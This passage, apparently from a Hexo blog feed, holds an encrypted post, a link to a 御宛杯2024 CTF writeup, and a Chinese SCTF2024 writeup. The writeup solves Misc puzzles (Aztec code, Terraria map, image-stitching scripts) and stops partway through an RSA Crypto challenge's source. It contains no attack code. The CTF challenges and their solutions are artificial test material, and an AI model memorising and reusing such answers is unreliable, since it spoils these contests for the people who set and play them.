400ffd56e25bd4da27a6c7c158c149da4c55000e014eeba3fa2e1b231de2e743c31f3753af560bbfbb22926bc562b91fec1c0898fa8097f115b46dd7f06b7694d0fc77b42db208a737e84dd8274178f5a1d3e9a36cad8c219c5a1353805d544aadd82ab563521aaf6643e862dfcca1a686f750071553793059af1b91f17fe89426082f9b94713df13a26bff3defda381fb7107298ae0deda305537a984e1c30f9bb9667e345fb71e83460d1de4765dbe242b98945bf8d2351f70580821935881f3d4d52b69b34973856b97232ba88104f921f54bf8d64f6aa8f9e71e01149b9a0ea631b74d23348f72beeb078395a96d8b28d78c4dfdc712ec1056733ffd048e9827862c9f64918be486ad95af3a04c1210f954600a91e1979f53680d82385e4454659aba8dc050437d81b099bf273e4fbd978d457823e1b2ab504cc2a95b201a74ac10f62eea016139e91787169f30f40c99a83db5efab11ad1f6c7d8b987426e4d49d47867b1c6d52484230320c19fff2ca9a60b9a2db782a0e84b8735cbe9e0ef62b6d3b34e4f0dd2e173e1260d1efce8582f6b3b377330d9bf0d4dae04e214129f5003f36269d988c66c4522dff8c8550c4cde80290c641dd492861584ef18254a5e5f74091cd83587f9c205491dd4cceeea5c2d53b8e7d2d3b1a47a40cc3b71f176238324a9e66163663e5025497d7cdf89e3f675241eb9401032864a2e3397b6fd0b398c3446ba25a406b421d8332925050dffb24690b2f0d69a2e1a1ac6b69f7ce54cff6137c1b88295b4ad4dceab7f90192abd911b9b3dba803b91e618a50274c9d177b38106a6da981ffd01167398ea2517093966791cc9317ae9c35b869a4dc7ae886bbaac6cc8ab0e1c53fafbfb809595c60afd824699295dfaeb88b6adc572ab2f889ee23423ed78f80e4924bba99137c76efdcbde1a3dc258a447778f2dd3de659abc97599e49946a13771fa6d0c8eb2c6eab5daa2ea1c1a0554e220faad6db58e92cca958c9ddecc145a3877f255619645c0c4747061f0c3cadbbc0d6074a5c418c531653cca7e0fb57e5244b1fd2fd6abd6cf20b436debe6fd5d902241827da39c670585c83d3450c75881f7de13a83a271486bf78878efc5cf985f1b9a45dc799945ab92603e12d84c93470a145e68650abda9ca8c87bbdaead23b701609954d327362b541d3261736016ce1eacb20492bf3e2a186742f3f635a052b36d8bd61ff2eca9322c5abb02cc7450a8f7b50b0289fbcd381ce0ababf09dd0c982ebd40b1764fdf8c67ee2af973156fe3eb77e6f7bf0e147e6d4115b39799b30e0211b0e4924903c50b02df4dfc980f4a78350d300f27f88c0beaecc144ef11e290b4869689ee210b51f2a3aa4364c56007cda5a5b51e46a1564eb81154e7632b76f828b03358be1b7bfd9d22ad219bbc9c32d6bd8dec52c455e8fa1fe380c85b21bdcfcfe532ab71940b5a50b2f24eb8bc4dda44f8eb9a57046d6eadf3641b9431f03afa35a02e9b4aedad2bcbe2e711c9708179bd851fc4666186a3ddc0af78de3c13de5021a2f432514b9e3a5f194747116dc0b75cbf11785a6435295023ed4e4b30a08a2f372cc5c375c3118fe4e570d11933085894c3ea3b209ffcb2f8ae0de24df4b4eb6f37bd504f088ccc3ee37928aaba4204fecf920ebb9caf63a7c52ffe0e828fa7ec4832643081c24a96ba99c0be32476d2d12eb432b536a460a1d297541b1a0298e92ce614a9dd0cebe99da202a918cde4c0c383e03c479a302a916cb64e7a5cfe01e60ec3e0f52f0992ea4b526bb52437cc658f921ef67adad1367aae83fbee003aa7247dfde6d80a1c104ff3db32772c0825a90407cef15158b25de0f436bd318c40fce7ce6864a7900e964ee79e68cd60c2448fda6e84a83c4fdcbc4920d04fbbb5bb6b61e733713cb6da633bd2d515d5e6bd51901ecd4acb95ce761d9df7c0f29d6575d9603d7ecd84f45481b6cb1189177d893636b2350a2d8b76406a8d9266118dcb028764a377336bb90651e5a5612c513f7a84879943d8b9e2ac20bf8c19da7a1a615adf6ee6155f0b42dd2256832a58a56d3d76ada98427e9c2e24dd2dd3d3eb97884e032444c9c053b4e26b09e3fbee5c5ded0aa076529cd9d114f7eb2e0f0425d8bc65770851a52891293842d3de13b49dcb9f56827ab738e106a07a2c0da025ec9b576a327179153d9e6eefb69ee7dffa00f4b33d72f5d7691c13f0ed7c0224a8813dc7d312a84b31495912883e07926d5d458e6fe6c2fad71e51014ab899b8b8981283937283af90951771061e7204f1d17dae1d81a6db6a2d66caf8dd1b8af53979f44b0f19420945b2fc1e72a380b30ce87d900ed82cfb1c2a048d4153b6978209ca497e5cd78034c931f6bf2f4dca4931f29af7610df304cd1a5d114409efabea70d08b4d1dbc81fe67ba74e3bf2d92897ea6b6587fc8024fc7bcdcbf37fea05d63530acfb6a3a494a65a9771aa8c76add2a280797b53bd4b615f7b9e4b5250dead41d6a61d1ac1fef1e49b85d6ff8f4f20d0e402ea3caf407ae73a5d6230c8744d4d19b85602d1493a1958c5bc4512329a2a5619fba90b90ae8627337e42f21aa1ae059db5063c7470a97781367b95fd126510219eb703771892ee0f793e95e7a578879dbaf5f62ec70d61fddc72c3e2d3b139a6c6c1226d6f3e7af34029ce9ce243c290dcf258e443d22a4511f1ef270822947220a7bd24b4cbc7de273bef910894fdbeb734658d688bbd6949cbccec35212cda20313de53d8ec6a7d19bc58dcb92efca4a056aa9629927f8e3acddf95fb8120cbc5059b126f53eaca9da3a29cbf2b2b9f2e26c39910c03230a03621f644dec918db9ed6884fe250ef0173a9a1ce623dbc73517ded4f787733a55e91f6f286cbcab59d762d2aca937f4ce1cf3be0a349f9d12c639192604b0b12b68483a29f1ac17dd8edbe276d626398196840c06fa0947b2da1b6b2a5d478d85ce56f7a6fdc70b4a9ef5c3e8961b6c9e3c834c537bef47411f3a9e7817a0c5b7b7ed26df4df441ea5ddbdc08002729c2769c3b127a0703afb46c3c1c4737dacb8295dac3ee1862074116bf2a0910de4dcbf291a622373b58bfb7345749ccd29903301dd262ba606772e18f1787c70e96f4f61c301d1fd9c589e4be974019105bed43f7bec9bb00506c29b0888ad1b284ef0883bf889acd56ff3db10a9cd90ee85021bb78edb90b952161c5219a959ecfcd463347a949add159b8888c43eaf060e604b8ead27e28e76c6fc618b996330c2832d766ba379c127790a3e025ec10b920884077b620592d3197ba34b7a9ceaddc8fdf8b7d4f4451366afbb3b097abb07e843785818cb538159a4c6d9cbfb5e0bf12eb0b42383153a7abb92db1cd94ea30f1266ef225f16c9aad0d88bc853b7f234cfadda87f3ed9a7637df3a7dd59dd5dce7796e0c8a94153d4644a49e5dcbd0804f975c8db89b45537c48bd5d1f1edbf154553f4a43cf1d4733a50212fd62ae6df4092739873cb19f1d5705edcde852635c332463b38d30f181f782cb252ac234cd56d64aa606750468246e282a230ef29067374bcce5a95bda9118fbf4d2f28641f89819a65382628015785764f0cc1e92ba99a13cde67d078da63c2882114dfb46874721862b8b96662d52b06e29e0d4bde8260c201827595a49ab3280efa39d03e3a8718f0935b44cfaa869de9c2d29948f6658e30f044e2c6e031dbba590b3ebf1b7da95ca22f1165e3ff2837239e9c58f2032ba1f2c3ef4fbf5f0e666a51386a7f54b423c611c5470a8dc9b2204efc2a5d2f460573b948af7a8ef78691bd4f0809fe46655d4987a94f98e69cea85e5a958670d6d39c8f605e605208c36adb702001eb1405cbf2ac6fdc04c0f13c04f1b0900d9a2ef76414eb36d696829db68f06fc0ee3162173807046ce3703e2e56c5b14030ff11616537b67ad5565c8ed275412f628373c317e22034e8fe673326e6f5c4fb6f4d62bd8f58d46029729b5572ca2e0e629f6931cfe8c820e7e9f6de164e94c438b526b46eac3be2ad94fba9887bba0d50145af9c15119ed984ccc0de3ee33a7208e492617eef88685385c9e2ce9546b6594e6ffac9fd6be56f75a4f0411f6fe1e785694b4e6c1a2b4a226f68cae072555beb471e1a011602fe221d88d411b169b8d011deeadbcc15f37c225835a17deff948731a2483645f3da1db609fa03032b4c14ed30b96c5b9b8b7003be255241cc6737f9a00c5fc4988ea6e7f2e08d72a807cca4290fdb7fc8a739b4f0e13e9722601d00c966c033d40fcc89159f0bd8370ca4220554b106576b60b8d8597c5531d501d1ba932bb99d088755b6997c8cfaca614cb019cd4bd93f1c58e87d0ddae743fd3aa208153901d8376145b29a44437d63ba815d9d8a18e30ae0e4d1ce0eeb8463374d5bc0c112211a0dbb7c69fb77bfc54c79d3f5ee1d3319b3b26fa0b49af43f96749b2a27e906b221c4400200d7b07e2c7856ba70bfbfa857c8b69f03413ec152c49e47d53692ad2935212639f7a18f18437c4dc8d9b01e185ecc55c9ff115f63168e72842ac8959f4d406278378d953c2295dbedb42ca6871456c9f21461ff78de46573fed7cfc9c2043e64269d6ce2b786daab03c6c70a00af4aaee1f769770f710f38c4f1c181f080a146bbd64d6dee8e58ce380b57dd14b7219a6e102ee8e5a95e322640e6f9f9480a13dcf8472bd0238b38d1dab7eaa00ae3d5d9b3d548be9f5e192885cc26f0df095917e5a08124864e0460054fb00cdf3585c20fe5bb2277fd436db332919acc73ede59ff87543ca0dfe073c33ca643fb98688522117aea73fd2d619ec6ebe1ea751b14059a7e0bf028b59c7e894353432839b742add526ca870f1f9883258fe97442afb32f0116067c98baddc65e2f4735327495aa4af4873c307e34cdf9d6a4e58d1a5d63298d8c249cdea344a824d7263d294267a85ba6f9428723a04165e47e271a842f2eccae99ad98aed09364ee7301fed26bd78207f8f6e7f95b67d972be537d3728ff01f6c72d13ee070349b4794256aeb52a522613a3180f81261caba7c0cf8ad0436dba9c1ec842ee9aec9554f9ec9f541e907401bb57d1aec36c76037be9d46ff86e0ef0fcef13330f5962789d99b9ad454d81350e74bf957d4ad197f24b1620d00bba93a4bb96d58b8d9820808338387220505e54c479acb92ffa2b7c98c44830ef4132de14629b2d18891164d2ba9cf055592a17f941fd87ebc6c07e536fc4038a24b8fff7c9af64f8bd4d08ca9e81baad1ac3ed4ee5d81d64d2ce7d2dba9b8ab92311df1f7e549a2f18dfdb64a4ac2230f05bdb3515f8e026ae30e54f5567c92fd39542c38a5dd8050750eb44a0b24c0512bcbaa410b7cacb39507b7d14a2fd7db4736c590e211d7f5aa0f540e924278a49665d22fb7edd8690f03708d3d5890626e50cc6eb3186f84e6db30b251911be690e700f35aca56f0069841bbc18db657ec3a3bf802bb5f545089713afc311463c0a776a26e708657b55f76e555c386888ad834b4b4b47bf6c1fa4e938a71cdff63ffc08963ac94c65e94a24eaa4f9b076ad8d202fa56616456f5acb3b0859a35ffa3676c2bcb3778f005f83684d8906672f0f97239a1046cdaf6f6b8eb57395929a792abc05f009d18aafac1c68278c27c2a84ce730dd216cb03f5cb88d9bf09b36dd4a0fef008f80efd10c3d182f22687735feea821b5d51086a646bd9db979455ad3586a1dd5847b4546ddd2c83b89729c15e6df2a2a5cecda128c5e94b121bd37e1c1dbae329b113e328a8e2b86c84f2ddac369f00667dc135756ee71108b6fc41031516008ddbb34c0a0feb9d4fc12e4801db816f8b6c20c61d9ecf391fcf15aa77c491883b3bc54dbfea8a1f23baa624b1c4234111cde7843e0bd26cddc2fb71aad178e0d0e8f8fd50bb439b2106e0b97f2eea945203f84463abce6b2380b757938fafc9fea7ecbaf7538c087542a83e6b9b095d9eea11b16f1f88f6dbaf906033a124dd816afe1157766f38a0fb7651ad4d1c806daddbddb425552c73cc6576367f6d636c0fdef2ec6808b9e706b03dccd04aaa915b316bba84d3150cbd7cd6073e89e60611665c5bb74d34ffe1732201e1d9dd3eed51d84012a26509f5b4aa1976c1e95466d6d55d6c2ad8e5ed213cb5d6d1fa8ba8fd1d06d397332653c85f6cf9455b1e4c3113bf6aba6c223fcc8c4a169c13e6e6657e060817d5cb754b8e94cde183fb511a24d74e4c19ecc3dbe99026941b45d2e251bb73fb922088aec7f96e6615e60afe8bf0e5f536df27c59d962db2a94e95eb94c81aeb16eb996a6e4dd2e9aa36fe4c50b23e460b2ddfc6aff13b3f7b685c920dde8db0b5bd54a1af8a7ae14ce06610472855eeb83a08410e73c713ef7f4c165d063cbca99b4bfc0a287f3423368e023a9fbf36a6cbb6f04bc4f3cd3065890f3d623b0ea17dd84302001d7edfdf621ae3106010ffa7137eac0b6ef70b3fc54c862978c63c62790dc63cd37e62465c4095a5cbd08dbbe7b6754176d044d4813f53a3410fcbb9f6300aadd088b1e84a54c97372f0f81fe72d8b1200c819660d53ad6ee5b8e8bef1f98d7352a942a46ad17f0666521d8f3721df2f1979bf33e94ffa09c1eac287cfd726d1bf1ea17db135837b86873072b585f4f618077d7b5d85831e32781ef4b5f3491edf5e985b2f86f66854033ca067d65710d24ff1417aac90876d52a37e80a664c1cea08dde3db42762711d43369fbd92ba05854da26ff77459dcd47e2a6b046da3076e8bca9d80c92d1299a869917ffc526c6701f1b47c1a8773af826534bc19351eb1a2d25f15e9672d8a1d2496e8f4e45601dafbed87786e4c8ff46059d29ad934d5e45718c3ac19ebda9fd69cf27e0a73929e73392ec175d8f138662f727bbed4c7f900fda989b72ca1148e7a98b781c6e9514a3ef3dcc4aeb4914100d00d5487df2dfa1b3baa4d112894d39979e2c332ece5b3c098c2e14f842f9d61bdf16bdd8c129ff1e180eb72ea08e0556ed215e1a46607334050560a1cc45d5dce2ffb8138f9de24b7a2f62c54588cd523f6e88be13b70105a5924315a0c4493b61a329e14b6d6bdf4c83c2e62b65191cc572cbec378d1c8b84596336dbfb0ae7c24d17e6c1641f33dc1fed67e5e02125d8581501b69d49529b175af105f541e0fc909b8b79fcc322020324c824f401933f7a624b609a9c4e9a505c77409dbd72fdbb9264cfbb64981894001d9c51e0e8d454b3db924979a629c94d70fc180567113bcc8e02d8e31d5156512d8437a798be980589afa9d54c524ebaba11cc286535de31f71af2a8cd8a08a6ad2d4dc95a8c39d8b9456896c5e94ea7f745e72be48bae963eafb888017d172059154ce6f4bfeda1967730bd55d22878b3bf24b8f298d62d11cb42060d3f81a6b744ca4ac286d4a49937c89472b5e3ef9858ebdbdb651ea35e71fdf5aea8ca32e313c30a81286887d80321841592ffdca445fe20199d3f8db826342038837ce3bebbf2cdc5956167aa6e0a2a8c1429af4c1f2a8370f253863c3c141b532346c587f1c3bdbc6e2687c02e553a42172f0cc2aadbc2a69304f7da4fa4459d7660872e19ac658ca87fbbde68c51c4cbdbd90ff0979350fb1ede36376caf27a4b433481584a63127ae20d4a7115f77e94f0d994c3140912207186cf1d103bc9dd38757f7182e32d36291186425dcff98f906522fcc275285acab1930448dc0783e7c5276957fc358b819703d19ce7d2cd8a72b92c442468af315d639880c1a2d1e16790695f68cae163434972a0caa92586554ba48abc0892cc8c55f3f344c316b1aae66915ee8e955fe25de3f934f22446790a5ec4a4c037559e4e84a70717dc293d62d33a3f04a7f24d2e68c3d3b5e2ea236be04d17bb98a5dd01afe09a485340e6abcbc805ecc3d386dd8beb51da3a19fcb29be972820887b7529d5e169891b38947972efd3b757c571b5ba37ec04d7c5eea2c59d376889e4b279967702b1ce26fd7044c134928d774044340a570ef01754da5881ef2e9d34b1d04b69d7105074d6e4e103ff56200dacf62c8b6a5e81658efad56cb9d6860b6f91054f3f04f284f56bda0f4aa2bfc59bcf019d9adc2eb3778962c5af25b6d4688fbbe7849652b73d9460f060a498747ceb3fb38e90178e2acf125b78f7c77cbfa782f07c70516cfbbf02dc4922ce5d5e2352ab78645dfbbef826bee606d0ab8ea3e70c61924d2c8d27570ff8ccdde552dee8ea54b177437aa1ecd279983a3f3f11de00042b3af691f9689842bb3db2fb2b22281483a9e55de0d28586c66e7d10aee860c4fa2ca9cce4ae328ed473506f14875758cd7be9ea384f9a23ef8467e019076d858703c806641eabed08d8ad3ca9a6c25490aed159921c3db273cc6b818b5836313bb67dcddb492c048044f72c52a4316976c873759db1cdd48ba3f1ae930d3a8b9d872532458a79e653185b49063fdbc3e7a0dc756158efdb5ba0a16c7be82fc65ba2e454f43607233b55e336b28c17fabd5a7f6c416a002864cd9489ea6eab2acad332fd1e42e762f8d65144891a4844bd68d351d9fb21a4f38ff0a6fe5ad854a3b7cc94b958a010eb284e21abaf3b2429620af7afcfa25905bf725e4be8d63847f45b39a217989c8f3feeb59c7319b3ef19248bca7d048c5801a3abcf3a7997e0bc814624c9e9409666919473553e09fb883595050176b95d79cbce5ff99fbd6b1550d15cc02d96aeb5a9669e9670b104a52d6a32ab595e34a54c1311b18655e303670c836d0289e97b2bcb49d682c2650fead8c2b1ddf4773cadba55fdc97dcee6816a94dc9c2a0ab43bceee1cad03e9211495b6b6e273b858fc62b988e7952636b64f01f073edcfcd8783910247f0bb585ed91edf02ea35fb4b2d1c00a0b1374d7dab807b81b994b8b8ab74eda46b21dc32a3bcbfc89062eaea58666576bfc5a5a3eaafc286224d11a4c67ae217b26444b80bb5e9244fb48c711abbcf1db1b77a0d483f4caecc45aeb639ae54e61c62adf155f9d9996f98ad1881c26313a6cd85eb51c5c6f332308293f576e575a7cb2564a6f9dd1ffa247981073035e1175b68468c7dbb44c4db8d7a51a7c51be8d6bbe1efdb9c7234a21eab6430e4b4af297caf41cd6f3fd3182e1f371abc0249e42ea00297bb3ba4f9a4199432ca0ee669be20450e89e646f2f4eb2afac86facfa523805799ab80ae95d9aa3803d1de35e9d66dafc7b620c5259066f354abadc9d247977a55a58127c36c2882184f51e269f0a7d94ec8c2af1be656d3cf7f160241a22727beb84265d0a86042b0962a43e3533b1e5cc94f7dec3ce814546bb8d4aad4a26adee7d44bbdcb41a5581806d4d6ba28c6ae9e3706c7c2fe49feadf34a74184a55dbfa1ffd9585fffbe1db886cd060265df83abab566b2da18b717766c67df0cf07a57243189d842264d62efde31f81dd9268df2641438bb5cd97d2a04f125acf219cf52dede5a2412f174a642edb4b0c61b48a8b4fc02d1cefdc1bb2f81b8919cd759789a3f4b722f54b47034960341abc2692b7ff5cb27380c237a296373c285112f97cb367a34be26a60ba0117b9c69f517305f1852e6f2729273f5c7690c985d30050cec7c3b7de01d5d4fafcc2ea304e42e13f79916338eb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>御宛杯2024 Writeup</title>
      <link href="/posts/4d648da/"/>
      <url>/posts/4d648da/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E5%BE%A1%E5%AE%9B%E6%9D%AF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 御宛杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2024 部分Writeup+复现</title>
      <link href="/posts/247dd771/"/>
      <url>/posts/247dd771/</url>
      
        <content type="html"><![CDATA[<blockquote><p>废了，只会签到，好好复现吧</p></blockquote><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Fixlt"><a href="#Fixlt" class="headerlink" title="Fixlt"></a>Fixlt</h4><p>拿到一个文本文档，查看内容是 css 样式，搭配 html 渲染一下，得到如下内容。</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241001173815118.png" alt="image-20241001173815118"></p><p>鼠标移上去，变成了aztec码的样子，但是不是很好扫，得写脚本处理一下，大概就是把除白色以外的所有像素点涂黑，然后再把横向和纵向黑色像素点间间距为1或2的部分涂黑</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241001173906121.png" alt="image-20241001173906121"></p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241001173919320.png" alt="image-20241001173919320"></p><p>随便找个解码器扫一下就行</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241001174008179.png" alt="image-20241001174008179"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h3><h4 id="TerraWorld"><a href="#TerraWorld" class="headerlink" title="TerraWorld"></a>TerraWorld</h4><p>对wld文件strings可以直接找到六个压缩包的密码</p><img src="/images/SCTF2024-部分Writeup-复现/image-20241002131518727.png" alt="image-20241002131518727" style="zoom:50%;" /><p>对每个图片取中间十行像素上下拼接起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">image_filenames = [<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(i).zfill(<span class="number">2</span>)&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(image_filenames[<span class="number">0</span>]) <span class="keyword">as</span> img:</span><br><span class="line">    width, height = img.size</span><br><span class="line"></span><br><span class="line">middle_start = (height - <span class="number">10</span>) // <span class="number">2</span></span><br><span class="line">middle_end = middle_start + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">cropped_images = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> image_filenames:</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(filename) <span class="keyword">as</span> img:</span><br><span class="line">        cropped_img = img.crop((<span class="number">0</span>, middle_start, width, middle_end))</span><br><span class="line">        cropped_images.append(cropped_img)</span><br><span class="line"></span><br><span class="line">total_height = <span class="built_in">sum</span>(img.height <span class="keyword">for</span> img <span class="keyword">in</span> cropped_images)</span><br><span class="line"></span><br><span class="line">result_image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, total_height))</span><br><span class="line"></span><br><span class="line">current_y_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> cropped_images:</span><br><span class="line">    result_image.paste(img, (<span class="number">0</span>, current_y_offset))</span><br><span class="line">    current_y_offset += img.height</span><br><span class="line"></span><br><span class="line">result_image.save(<span class="string">&quot;combined_image.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;图像拼接完成，新图像已保存为 combined_image.png&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_images_vertically</span>(<span class="params">image_filenames, output_filename</span>):</span><br><span class="line"></span><br><span class="line">    images = [Image.<span class="built_in">open</span>(filename) <span class="keyword">for</span> filename <span class="keyword">in</span> image_filenames]</span><br><span class="line"></span><br><span class="line">    widths = <span class="built_in">set</span>([img.width <span class="keyword">for</span> img <span class="keyword">in</span> images])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(widths) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;所有图像必须具有相同的宽度&quot;</span>)</span><br><span class="line"></span><br><span class="line">    total_height = <span class="built_in">sum</span>(img.height <span class="keyword">for</span> img <span class="keyword">in</span> images)</span><br><span class="line"></span><br><span class="line">    new_image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (images[<span class="number">0</span>].width, total_height))</span><br><span class="line"></span><br><span class="line">    current_y_offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> images:</span><br><span class="line">        new_image.paste(img, (<span class="number">0</span>, current_y_offset))</span><br><span class="line">        current_y_offset += img.height</span><br><span class="line"></span><br><span class="line">    new_image.save(output_filename)</span><br><span class="line"></span><br><span class="line">image_filenames = [<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>)]  <span class="comment"># 从1.png到6.png</span></span><br><span class="line"></span><br><span class="line">output_filename = <span class="string">&quot;stacked_image.png&quot;</span></span><br><span class="line"></span><br><span class="line">stack_images_vertically(image_filenames, output_filename)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;图像拼接完成，新图像已保存为 <span class="subst">&#123;output_filename&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到这样一张图片</p><img src="/images/SCTF2024-部分Writeup-复现/image-20241002134548945.png" alt="image-20241002134548945" style="zoom:50%;" /><p>但是由于出题人的失误，以上都没有用</p><p>用010看wld文件，可以发现里面还藏了第二个地图文件</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002134813182.png" alt="image-20241002134813182"></p><p>用地图编辑器tedit打开可以看到一个奇怪的字符串</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002134935187.png" alt="image-20241002134935187"></p><p>用cyberchef爆破可以发现异或密钥e时可以得到flag</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002135126430.png" alt="image-20241002135126430"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbits</span>):</span><br><span class="line">        self.nbits = nbits</span><br><span class="line">        self.p, self.q = self.getPrimes()</span><br><span class="line">        self.n = self.p*self.q</span><br><span class="line">        self.Gift = self.Gift()</span><br><span class="line">        self.priv, self.pub = self.keyGen()</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPrimes</span>(<span class="params">self</span>):</span><br><span class="line">        nbits = self.nbits</span><br><span class="line">        p = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        q = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">while</span> p == q:</span><br><span class="line">            q = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> 